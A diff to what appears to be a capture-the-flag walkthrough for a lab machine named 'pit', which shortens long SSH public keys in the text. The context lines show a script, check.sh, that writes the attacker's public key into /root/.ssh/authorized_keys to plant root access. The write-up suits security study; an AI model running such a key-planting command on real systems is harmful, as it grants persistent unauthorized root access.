@@ -94,7 +94,7 @@ The key's randomart image is:
 
 ┌──(kali㉿Linux)-[~/Desktop]
 └─$ cat joker.pub
-ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDd3NZiNcpyRU6oXUFkD1fgCPwCWajBFXqQeNXdh3O6LY9Ks5FI0mFzz7tmt0lqXsZC5fy+AhoLjpEi20BHnKB4/jbR1UUx66t/WqORo920Q65li7YRGJROHktc5zppR3bKKmESsajJ/tYX2uwWUxkP0VYZu8E8+Lq+gzaf4p/v60cG8apuCmdOzWWyxvo9xgTQkX2YXGWChWhduuTVVOeGmbDt11aZzwcPZ3PB/ExYxKf/ZnTXhJ38KmilySSsBdCnRr1yO/CStpiytJhLJqP63/gL8XUY5x/A379SNX8vHMi+G8WBWP2IxWS2px2jTJ4FUyaJTiLm/9w7fcZsDGM0UmLnkmCeOW/pyWs+Qal9x6ZZGxi+BToxk/UnpfRf/Dp9cOCT1Uq7bB4UIAo6y1sgc7p/64dUGchnH+dTR66cj0PdbVhFL4yOALNM4QtuTnIaq7M7DH5Bgaek9DcVjqEqLeWJPSAEN6K65LfcNTio8mTO3eRkD9x8T3dDuAcgnkU= kali@Linux
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDd3NZiNcpyRU6oXUFkD1fgCPwCWajBFXqQe<----snip----->D9x8T3dDuAcgnkU= kali@Linux
                                                                                                                                                
 ┌──(kali㉿Linux)-[~/Desktop]
 └─$ mousepad check.sh  (create a bash script)....👇️
@@ -103,7 +103,7 @@ ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDd3NZiNcpyRU6oXUFkD1fgCPwCWajBFXqQeNXdh3O6
 └─$ cat check.sh 
 #!/bin/bash
 
-echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDd3NZiNcpyRU6oXUFkD1fgCPwCWajBFXqQeNXdh3O6LY9Ks5FI0mFzz7tmt0lqXsZC5fy+AhoLjpEi20BHnKB4/jbR1UUx66t/WqORo920Q65li7YRGJROHktc5zppR3bKKmESsajJ/tYX2uwWUxkP0VYZu8E8+Lq+gzaf4p/v60cG8apuCmdOzWWyxvo9xgTQkX2YXGWChWhduuTVVOeGmbDt11aZzwcPZ3PB/ExYxKf/ZnTXhJ38KmilySSsBdCnRr1yO/CStpiytJhLJqP63/gL8XUY5x/A379SNX8vHMi+G8WBWP2IxWS2px2jTJ4FUyaJTiLm/9w7fcZsDGM0UmLnkmCeOW/pyWs+Qal9x6ZZGxi+BToxk/UnpfRf/Dp9cOCT1Uq7bB4UIAo6y1sgc7p/64dUGchnH+dTR66cj0PdbVhFL4yOALNM4QtuTnIaq7M7DH5Bgaek9DcVjqEqLeWJPSAEN6K65LfcNTio8mTO3eRkD9x8T3dDuAcgnkU= kali@Linux" > /root/.ssh/authorized_keys
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDd3NZiNcpyRU6ogCPwCWajB<----snip----->uAcgnkU= kali@Linux" > /root/.ssh/authorized_keys
 
 
 ┌──(kali㉿Linux)-[~/Desktop]
@@ -123,7 +123,7 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 [michelle@pit monitoring]$ cat check.sh
 #!/bin/bash
 
-echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDd3NZiNcpyRU6oXUFkD1fgCPwCWajBFXqQeNXdh3O6LY9Ks5FI0mFzz7tmt0lqXsZC5fy+AhoLjpEi20BHnKB4/jbR1UUx66t/WqORo920Q65li7YRGJROHktc5zppR3bKKmESsajJ/tYX2uwWUxkP0VYZu8E8+Lq+gzaf4p/v60cG8apuCmdOzWWyxvo9xgTQkX2YXGWChWhduuTVVOeGmbDt11aZzwcPZ3PB/ExYxKf/ZnTXhJ38KmilySSsBdCnRr1yO/CStpiytJhLJqP63/gL8XUY5x/A379SNX8vHMi+G8WBWP2IxWS2px2jTJ4FUyaJTiLm/9w7fcZsDGM0UmLnkmCeOW/pyWs+Qal9x6ZZGxi+BToxk/UnpfRf/Dp9cOCT1Uq7bB4UIAo6y1sgc7p/64dUGchnH+dTR66cj0PdbVhFL4yOALNM4QtuTnIaq7M7DH5Bgaek9DcVjqEqLeWJPSAEN6K65LfcNTio8mTO3eRkD9x8T3dDuAcgnkU= kali@Linux" > /root/.ssh/authorized_keys
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDd3NZiNcpyRU6oXUF<----snip----->LfcNTio8mTO3eRkD9x8T3dDuAcgnkU= kali@Linux" > /root/.ssh/authorized_keys
 
 
 (***) My Machine:
